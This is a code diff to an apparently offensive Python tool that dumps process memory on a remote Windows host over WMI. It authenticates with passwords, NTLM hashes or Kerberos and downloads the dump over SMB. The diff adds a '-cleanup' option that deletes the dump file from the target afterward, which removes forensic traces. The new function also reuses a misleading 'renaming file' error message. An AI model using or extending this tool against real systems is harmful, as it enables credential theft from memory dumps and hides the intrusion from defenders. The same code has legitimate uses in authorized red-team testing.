@@ -270,6 +270,9 @@ def create_dump(options):
             # downloading through WMI without an event sub is unlikely
             #read_file(options, dump_file, out_name)
 
+            if options.cleanup:
+                cleanup_dump_file(options, dump_file)
+
     except DCERPCSessionError as e:
         if e.error_code == 0x8004100E:  # WBEM_E_INVALID_NAMESPACE
             print(f"Invalid namespace, this namespace is only valid on Windows Server 2016 and later")
@@ -303,7 +306,30 @@ def rename_dump_file(options, old_name):
         print(f"An error occured renaming file")
         wmi.close()
         return None
-       
+
+def cleanup_dump_file(options, dump_file):
+    target_namespace = '//./root/CIMv2'
+    domain, username, password, address = parse_target(options.target)
+    dump_file_escaped = dump_file.replace('\\', '\\\\')
+
+    try:
+        wmi = WMI(address, target_namespace, username, password, domain, options.hashes, options.aesKey, options.k, options.dc_ip)
+        wmi.connect()
+        print(f'Removing {dump_file}')
+        try:
+            obj, _ = wmi.iWbemServices.GetObject(f"CIM_DataFile.Name='{dump_file_escaped}'")
+            obj.Delete(dump_file_escaped)
+            wmi.close()
+            return
+        except Exception as e:
+            if str(e).find('S_FALSE') < 0:
+                print(e)
+            return None
+    except Exception as e:
+        print(f"An error occured renaming file")
+        wmi.close()
+        return None   
+
 def main():
     parser = argparse.ArgumentParser(add_help=True, description="Dump processes over WMI with either PID or process name. Only worked on Windows Server 2016 and higher")
     parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
@@ -311,6 +337,7 @@ def main():
     parser.add_argument('-proc', action='store', help='process name to dump')
     parser.add_argument('-rename', action='store', help='rename file after dump')
     parser.add_argument('-download', action='store_true', help='download file over SMB')
+    parser.add_argument('-cleanup', action='store_true', help='remove file after download')
     parser.add_argument('-cimv2', action='store_true', help='Connect to CIMv2 instead of management tools namespace')
     group = parser.add_argument_group('authentication')
     group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
